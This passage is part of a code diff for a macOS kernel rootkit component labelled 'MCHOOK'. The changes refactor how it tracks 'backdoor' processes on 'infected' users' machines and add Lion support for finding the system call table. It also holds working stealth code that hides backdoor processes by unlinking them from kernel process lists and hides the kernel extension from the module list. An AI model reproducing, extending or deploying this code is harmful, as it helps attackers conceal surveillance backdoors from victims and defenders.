-  if (g_backdoor_counter == 0) {
+  if (g_registered_backdoors > 0) {
+    // Let's see if the backdoor is already registered
+    bd_index = get_bd_index(username, p->p_pid);
+  }
+  else {
 #ifdef DEBUG
     printf("[MCHOOK] First backdoor, hooking\n");
 #endif
   }
-  else {
-    for (i = 0; i < g_backdoor_counter_static; i ++) {
+  
+  switch (bd_index) {
+    case -2:
 #ifdef DEBUG
-      printf("userName: %s\n", userName);
-      printf("userName registered: %s\n", g_reg_backdoors[i]->username);
+      printf("[MCHOOK] Already registered (same pid and is active) on init\n");
 #endif
-      if (strncmp(g_reg_backdoors[i]->username, userName, MAX_USER_SIZE) == 0
-          && g_reg_backdoors[i]->pid == p->p_pid) {
+      break;
+    case -1: {
 #ifdef DEBUG
-        printf("Backdoor already registered, checking if it's active\n");
+      printf("[MCHOOK] Backdoor not found on init\n");
 #endif
-        if (g_reg_backdoors[i]->isActive == 1) {
+      MALLOC(g_reg_backdoors[g_registered_backdoors],
+             reg_backdoors_t *,
+             sizeof(reg_backdoors_t),
+             MK_MBUF,
+             M_WAITOK);
+
+      _index = g_registered_backdoors;
+      g_registered_backdoors++;
+      result = TRUE;
+    } break;
+    default: {
 #ifdef DEBUG
-          printf("Backdoor already registered and active\n");
+      printf("[MCHOOK] Already registered user (dead bd) %d\n", bd_index);
 #endif
-          g_reg_backdoors[i]->pid = p->p_pid;
-          //g_backdoor_current = i;
-          
-          return;
-        }
-        else {
-#ifdef DEBUG
-          printf("Backdoor already registered but not active\n");
-#endif
-          backdoorFound = i;
-          break;
-        }
+      
+      int numPath = g_reg_backdoors[bd_index]->path_counter;
+      g_reg_backdoors[bd_index]->path_counter = 0;
+      
+      // Backdoor is already registered
+      for (i = 0; i < numPath; i++) {
+        memset(g_reg_backdoors[bd_index]->path[i], '\0', MAX_DIRNAME_SIZE);
       }
-    }
+    
+      _index = bd_index;
+      result = TRUE;
+    } break;
   }
+
+  // Initialize the structure entry
+  //g_reg_backdoors[_index]->path_counter   = 0;
   
-  if (backdoorFound != -1) {
-    for (i = 0; i < g_reg_backdoors[backdoorFound]->pathCounter; i++) {
-      memset(g_reg_backdoors[backdoorFound]->path[i], '\0', MAX_DIRNAME_SIZE);
-    }
-    
-    _index = backdoorFound;
-    
-    if (g_backdoor_counter_static == 0)
-      g_backdoor_counter_static++;
-    
-    if (backdoorFound == g_next_free_index)
-      g_next_free_index = -1;
-  }
-  else if (g_next_free_index != -1) {
-    //MALLOC(g_reg_backdoors[g_next_free_index], t_dentries *, sizeof(t_dentries), MK_MBUF, M_WAITOK);
-    for (i = 0; i < g_reg_backdoors[g_next_free_index]->pathCounter; i++) {
-      memset(g_reg_backdoors[g_next_free_index]->path[i], '\0', MAX_DIRNAME_SIZE);
-      //strncpy(g_reg_backdoors[g_next_free_index]->path[i], '\0', strlen(g_reg_backdoors[g_next_free_index]->path[i]));
-    }
-    
-    memset(g_reg_backdoors[g_next_free_index]->username, '\0', MAX_USER_SIZE);
-    
-    _index = g_next_free_index;
-    g_next_free_index = -1;
-    
-    if (g_backdoor_counter_static == 0)
-      g_backdoor_counter_static++;
-  }
-  else {
-    MALLOC(g_reg_backdoors[g_backdoor_counter_static],
-           reg_backdoors_t *,
-           sizeof(reg_backdoors_t),
-           MK_MBUF,
-           M_WAITOK);
-    
-    _index = g_backdoor_counter_static;
-    g_backdoor_counter_static++;
-  }
+  g_reg_backdoors[_index]->p              = p;
+  /*g_reg_backdoors[_index]->pid            = p->p_pid;*/
+  g_reg_backdoors[_index]->is_active      = 1;
+  g_reg_backdoors[_index]->is_hidden      = 0;
+  g_reg_backdoors[_index]->is_task_hidden = 0;
+  g_reg_backdoors[_index]->is_proc_hidden = 0;
   
-  //g_backdoor_current = _index;
-  
-  // Initialize pathCounter instance variable
-  g_reg_backdoors[_index]->pathCounter = 0;
-  
-  // and pid
-  g_reg_backdoors[_index]->p            = p;
-  g_reg_backdoors[_index]->pid          = p->p_pid;
-  g_reg_backdoors[_index]->isActive     = 1;
-  g_reg_backdoors[_index]->isHidden     = 0;
-  g_reg_backdoors[_index]->isTaskHidden = 0;
-  g_reg_backdoors[_index]->isProcHidden = 0;
-  
-  strncpy(g_reg_backdoors[_index]->username, userName, MAX_USER_SIZE);
-  g_backdoor_counter++;
+  strncpy(g_reg_backdoors[_index]->username, username, MAX_USER_SIZE);
   
 #ifdef DEBUG
   printf("[MCHOOK] index (%d)\n", _index);
   printf("[MCHOOK] user (%s)\n", g_reg_backdoors[_index]->username);
 #endif
+  
+  return result;
 }
-
 
 int remove_dev_entry()
 {
@@ -1134,39 +1138,35 @@ int remove_dev_entry()
   return 0;
 }
 
-void dealloc_meh(char *userName, pid_t pid)
+void dealloc_meh(char *username, pid_t pid)
 {
-  int z = -1;
-  int i = 0;
+  int bd_index = -1;
   
-  for (i = 0; i < g_backdoor_counter_static; i++) {
-    if (strncmp(g_reg_backdoors[i]->username, userName, MAX_USER_SIZE) == 0
-        && g_reg_backdoors[i]->pid == pid
-        && g_reg_backdoors[i]->isActive == 1) {
-      z = i;
-    }
-  }
-  
-  if (z != -1) {
-    //FREE(g_reg_backdoors[z], MK_MBUF);
-    g_reg_backdoors[z]->isActive = 0;
-    g_reg_backdoors[z]->isHidden = 0;
-    g_reg_backdoors[z]->isTaskHidden = 0;
-    g_reg_backdoors[z]->isProcHidden = 0;
-    g_next_free_index = z;
-    if (g_backdoor_counter > 0)
-      g_backdoor_counter--;
+  bd_index = get_active_bd_index(username, pid);
+  if (bd_index != -1) {
+    FREE(g_reg_backdoors[bd_index], MK_MBUF);
+    /*g_reg_backdoors[z]->is_active = 0;*/
+    /*g_reg_backdoors[z]->is_hidden = 0;*/
+    /*g_reg_backdoors[z]->is_task_hidden = 0;*/
+    /*g_reg_backdoors[z]->is_proc_hidden = 0;*/
+    
+    if (g_registered_backdoors > 0)
+      g_registered_backdoors--;
   }
 }
 
-int get_backdoor_index(proc_t p, char *username)
+//
+// Get the backdoor index among the active ones
+//
+int
+get_active_bd_index(char *username, pid_t pid)
 {
   int i  = 0;
   
-  for (i = 0; i < g_backdoor_counter_static; i++) {
-    if (g_reg_backdoors[i]->pid == p->p_pid
-        && (strncmp(username, g_reg_backdoors[i]->username, MAX_USER_SIZE) == 0)
-        && g_reg_backdoors[i]->isActive == 1) {
+  for (i = 0; i < g_registered_backdoors; i++) {
+    if ((strncmp(username, g_reg_backdoors[i]->username, MAX_USER_SIZE) == 0)
+        && g_reg_backdoors[i]->p->p_pid   == pid
+        && g_reg_backdoors[i]->is_active  == 1) {
       return i;
     }
   }
@@ -1174,8 +1174,45 @@ int get_backdoor_index(proc_t p, char *username)
   return -1;
 }
 
+//
+// Get the backdoor index even if not active (but present in the array)
+//
+int
+get_bd_index(char *username, pid_t pid)
+{
+  int i     = 0;
+  int index = -1;
+
+  for (; i < g_registered_backdoors; i++) {
+    if (strncmp(g_reg_backdoors[i]->username, username, MAX_USER_SIZE) == 0) {
+#ifdef DEBUG
+      printf("[MCHOOK] User already infected, checking if active\n");
+#endif
+      if (g_reg_backdoors[i]->p->p_pid      == pid
+          && g_reg_backdoors[i]->is_active  == 1) {
+#ifdef DEBUG
+        printf("[MCHOOK] Backdoor already registered and active\n");
+#endif
+        index = -2;
+        break;
+      }
+      else {
+#ifdef DEBUG
+        printf("[MCHOOK] Backdoor already registered but not active\n");
+#endif
+        index = i;
+        break;
+      }
+    }
+  }
+
+  return index;
+}
+
 int check_symbols_integrity()
 {
+  g_symbols_resolved = 0;
+
   if (i_allproc               != NULL
       && i_tasks              != NULL
       && i_nsysent            != NULL
@@ -1188,12 +1225,9 @@ int check_symbols_integrity()
       && i_proc_list_lock     != NULL
       && i_proc_list_unlock   != NULL) {
     g_symbols_resolved = 1;
-    return 1;
   }
   
-  g_symbols_resolved = 0;
-  
-  return 0;
+  return g_symbols_resolved;
 }
 
 int is_leopard()
@@ -1205,9 +1239,77 @@ int is_leopard()
   return 0;
 }
 
+int is_snow_leopard()
+{
+  if (g_os_major    == 10
+      && g_os_minor == 6)
+    return 1;
+  
+  return 0;
+}
+
+int is_lion()
+{
+  if (g_os_major    == 10
+      && g_os_minor == 7)
+    return 1;
+  
+  return 0;
+}
+
 #pragma mark -
 #pragma mark DKOM
 #pragma mark -
+
+int hide_proc_l(proc_t p, char *username, int bd_index)
+{
+  proc_t proc = NULL;
+  
+#ifdef DEBUG
+  printf("[MCHOOK] Hiding Lion proc: %d\n", p->p_pid);
+#endif
+
+  i_proc_list_lock();
+  
+  //
+  // Unlinking proc
+  //
+  LIST_FOREACH(proc, i_allproc, p_list) {
+    if (proc->p_pid == p->p_pid) {
+#ifdef DEBUG
+      printf("[MCHOOK] pid %d found\n", p->p_pid);
+#endif
+      
+      i_proc_lock(proc);
+      
+      LIST_REMOVE(proc, p_list);
+      LIST_REMOVE(proc, p_hash);
+      
+      i_proc_unlock(proc);
+      //(*i_nprocs)--;
+      
+#ifdef DEBUG
+      printf("[MCHOOK] Procs count: %d\n", *i_nprocs);
+#endif
+      
+      g_reg_backdoors[bd_index]->is_proc_hidden = 1;
+      break;
+    }
+  }
+  
+  i_proc_list_unlock();
+  
+  if (g_reg_backdoors[bd_index]->is_task_hidden     == 1
+      || g_reg_backdoors[bd_index]->is_proc_hidden  == 1) {
+#ifdef DEBUG
+    printf("[MCHOOK] Task hidden: %d\n", g_reg_backdoors[bd_index]->is_task_hidden);
+    printf("[MCHOOK] Proc hidden: %d\n", g_reg_backdoors[bd_index]->is_proc_hidden);
+#endif
+    g_reg_backdoors[bd_index]->is_hidden = 1;
+  }
+  
+  return 0;
+}
 
 int hide_proc(proc_t p, char *username, int backdoor_index)
 {
@@ -1220,7 +1322,7 @@ int hide_proc(proc_t p, char *username, int backdoor_index)
 #if 0
   //
   // g_backdoor_current is not safe for 2 or more backdoors on the same machine
-  // in which case we'll be calling get_backdoor_index
+  // in which case we'll be calling get_active_bd_index
   //
   if (g_backdoor_current != -1) {
     if (g_reg_backdoors[g_backdoor_current]->isHidden == 1) {
@@ -1232,7 +1334,7 @@ int hide_proc(proc_t p, char *username, int backdoor_index)
     }
   }
   else {
-    if ((_index = get_backdoor_index(p, username)) != -1) {
+    if ((_index = get_active_bd_index(p, username)) != -1) {
       g_backdoor_current = _index;
     }
     else {
@@ -1302,7 +1404,7 @@ int hide_proc(proc_t p, char *username, int backdoor_index)
       printf("[MCHOOK] Procs count: %d\n", *i_nprocs);
 #endif
       
-      g_reg_backdoors[backdoor_index]->isProcHidden = 1;
+      g_reg_backdoors[backdoor_index]->is_proc_hidden = 1;
       break;
     }
     
@@ -1311,13 +1413,13 @@ int hide_proc(proc_t p, char *username, int backdoor_index)
   
   i_proc_list_unlock();
   
-  if (g_reg_backdoors[backdoor_index]->isTaskHidden     == 1
-      || g_reg_backdoors[backdoor_index]->isProcHidden  == 1) {
+  if (g_reg_backdoors[backdoor_index]->is_task_hidden     == 1
+      || g_reg_backdoors[backdoor_index]->is_proc_hidden  == 1) {
 #ifdef DEBUG
-    printf("[MCHOOK] Task hidden: %d\n", g_reg_backdoors[backdoor_index]->isTaskHidden);
-    printf("[MCHOOK] Proc hidden: %d\n", g_reg_backdoors[backdoor_index]->isProcHidden);
+    printf("[MCHOOK] Task hidden: %d\n", g_reg_backdoors[backdoor_index]->is_task_hidden);
+    printf("[MCHOOK] Proc hidden: %d\n", g_reg_backdoors[backdoor_index]->is_proc_hidden);
 #endif
-    g_reg_backdoors[backdoor_index]->isHidden = 1;
+    g_reg_backdoors[backdoor_index]->is_hidden = 1;
   }
   
   return 0;
@@ -1366,13 +1468,13 @@ int unhide_proc(proc_t p, int backdoor_index)
   //
   // Link back our proc entry
   //
-  if (g_reg_backdoors[backdoor_index]->isProcHidden == 1) {
+  if (g_reg_backdoors[backdoor_index]->is_proc_hidden == 1) {
     i_proc_list_lock();
     LIST_INSERT_HEAD(i_allproc, p, p_list);
     //(*i_nprocs)++;
     i_proc_list_unlock();
     
-    g_reg_backdoors[backdoor_index]->isProcHidden = 0;
+    g_reg_backdoors[backdoor_index]->is_proc_hidden = 0;
   }
   else {
 #ifdef DEBUG
@@ -1380,11 +1482,11 @@ int unhide_proc(proc_t p, int backdoor_index)
 #endif
   }
   
-  g_reg_backdoors[backdoor_index]->isHidden       = 0;
+  g_reg_backdoors[backdoor_index]->is_hidden = 0;
   
 #ifdef DEBUG
   printf("[MCHOOK] Procs count: %d\n", *i_nprocs);
-#endif  
+#endif
   
   return 0;
 }
@@ -1397,9 +1499,9 @@ int unhide_all_procs()
   
   int i  = 0;
   
-  for (i = 0; i < g_backdoor_counter_static; i++) {
-    if (g_reg_backdoors[i]->isActive    == 1
-        && g_reg_backdoors[i]->isHidden == 1) {
+  for (i = 0; i < g_registered_backdoors; i++) {
+    if (g_reg_backdoors[i]->is_active    == 1
+        && g_reg_backdoors[i]->is_hidden == 1) {
       unhide_proc(g_reg_backdoors[i]->p, i);
     }
   }
@@ -1418,15 +1520,6 @@ void hide_kext_leopard()
   if (g_kext_hidden == 0) {
     for (k = i_kmod; k->next != NULL; k = k->next) {
       if (strncmp(k->name, kext_name, sizeof(kext_name)) == 0) {
-#ifdef DEBUG
-        printf("[MCHOOK] kext found\n");
-        printf("[MCHOOK] kext @ %p\n", k);
-        printf("[MCHOOK] kext name: %s\n", k->name);
-        printf("[MCHOOK] prev kext @ %p\n", prev_k);
-        printf("[MCHOOK] prev kext name: %s\n", prev_k->name);
-        printf("[MCHOOK] prev kext next: %p\n", prev_k->next);
-#endif
-        
         prev_k->next = prev_k->next->next;
         g_kext_hidden = 1;
         break;
@@ -1440,26 +1533,22 @@ void hide_kext_leopard()
     printf("[MCHOOK] KEXT is already hidden\n");
 #endif
   }
-
 }
 
 //
 // Landon Fuller trick updated for SL support
 //
-static struct sysent 
+static struct sysent
 *find_sysent(os_version_t *os_ver)
 {
   unsigned int table_size;
   struct sysent *table = NULL;
-  uint32_t x = 0;
-  uint32_t size_of_block_to_search = 0x100;
   
   table_size = sizeof(struct sysent) * (*i_nsysent);
-  if (os_ver->major     == 10
-      && os_ver->minor  == 5) {
+  if (is_leopard() == 1) {
 #ifdef DEBUG
     printf("[MCHOOK] find_sysent for leopard\n");
-    printf("[MCHOOK] nsysent: %d\n", *i_nsysent);
+    printf("[MCHOOK] nsysent: %ld\n", (long int)*i_nsysent);
 #endif
     table = (struct sysent *)(((char *)i_nsysent) + sizeof(int));
 #if __i386__
@@ -1467,12 +1556,17 @@ static struct sysent
     table = (struct sysent *)(((uint8_t *)table) + 28);
 #endif
   }
-  else if (os_ver->major    == 10
-           && os_ver->minor == 6) {
+  else if (is_snow_leopard() == 1) {
 #ifdef DEBUG
     printf("[MCHOOK] find_sysent for snow leopard\n");
-    printf("[MCHOOK] nsysent: %d\n", *i_nsysent);
+    printf("[MCHOOK] nsysent: %ld\n", (long int)*i_nsysent);
 #endif
+    uint32_t x;
+    uint32_t size_of_block_to_search;
+    
+    x = 0;
+    size_of_block_to_search = 0x100;
+    
     table = (struct sysent *)((char *)i_nsysent);
 #if __i386__
     //
@@ -1510,12 +1604,64 @@ static struct sysent
     }
 #endif
   }
+  else if (is_lion() == 1) {
+#ifdef DEBUG
+    printf("[MCHOOK] find_sysent for lion\n");
+    printf("[MCHOOK] nsysent: %ld\n", (long int)*i_nsysent);
+#endif
+    uint32_t x;
+    uint32_t size_of_block_to_search;
+    
+    x = 0;
+    size_of_block_to_search = 0x100;
+    
+    table = (struct sysent *)((char *)i_nsysent);
+#if __x86_64__
+    //
+    // -0x4498 bytes from nsysent
+    // rev
+    //
+    table = (struct sysent *)((char *)table - 0x4498);
+#ifdef DEBUG
+    printf("[MCHOOK] table @ 0x%llx\n", (unsigned long long)table);
+    printf("[MCHOOK] nsysent @ 0x%p\n", i_nsysent);
+#endif
+#else
+#ifdef DEBUG
+    printf("[MCHOOK] not ready for 32bit lion kernel\n");
+#endif
+
+    return NULL;
+#endif
+    
+#ifdef DEBUG
+    printf("[MCHOOK] Entering heuristic\n");
+#endif
+    
+    char *ptr_to_table = (char *)table;
+    for (x = 0; x <= size_of_block_to_search; x++) {
+      table = (struct sysent *)ptr_to_table++;
+      
+      // Sanity check
+      if (table[SYS_syscall].sy_narg    == 0 &&
+          table[SYS_exit].sy_narg       == 1 &&
+          table[SYS_fork].sy_narg       == 0 &&
+          table[SYS_read].sy_narg       == 3 &&
+          table[SYS_wait4].sy_narg      == 4 &&
+          table[SYS_ptrace].sy_narg     == 4) {
+#ifdef DEBUG
+        printf("[MCHOOK] heuristic matched sysent @%p, x = 0x%x\n", table, x);
+#endif
+        return table;
+      }
+    }
+  }
 
   if (table == NULL)
     return NULL;
   
 #ifdef DEBUG
-  printf("[MCHOOK] nsysent@%p\n[MCHOOK] sysent@%p\n", i_nsysent, table);
+  printf("[MCHOOK] sysent@%p\n",  table);
 #endif
 
   // Sanity check
@@ -1528,7 +1674,6 @@ static struct sysent
 #ifdef DEBUG
     printf("[MCHOOK] sysent sanity check succeeded\n");
 #endif
-    
     return table;
   }
   else {
@@ -1549,6 +1694,7 @@ mchook_start (kmod_info_t *ki, void *d)
 {
 #ifdef DEBUG
   printf("[MCHOOK] Registering our device\n");
+  printf("[MCHOOK] Size of NSUInteger: %ld\n", sizeof(NSUInteger));
 #endif
   
   // Register our device in /dev
@@ -1584,7 +1730,7 @@ mchook_stop (kmod_info_t *ki, void *d)
   printf("[MCHOOK] KEXT stop called\n");
 #endif
   
-  if (g_backdoor_counter == 0) {
+  if (g_registered_backdoors == 0) {
     if (remove_dev_entry() == 0) {
 #ifdef DEBUG
       printf("[MCHOOK] KEXT unloaded correctly\n");
